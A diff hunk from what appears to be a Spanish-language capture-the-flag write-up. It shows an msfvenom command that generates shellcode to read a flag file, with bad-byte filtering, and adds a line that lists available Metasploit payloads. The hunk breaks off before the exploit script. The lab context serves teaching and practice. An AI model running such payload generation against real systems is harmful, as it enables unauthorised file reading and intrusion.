@@ -16,6 +16,10 @@ Creamos el payload con metasploit:
 msfvenom -p linux/x86/read_file PATH=/home/ctf/flag.txt -n 16 -b '\x00\x20\x0d\x0a' -f python
 ```
 
+Si queremos ver todos los payloads disponibles para cada arquitectura:
+```
+msfvenom -l payload
+```
 Y así generamos nuestro cutre script que nos da el valor del flag:
 
 ```python
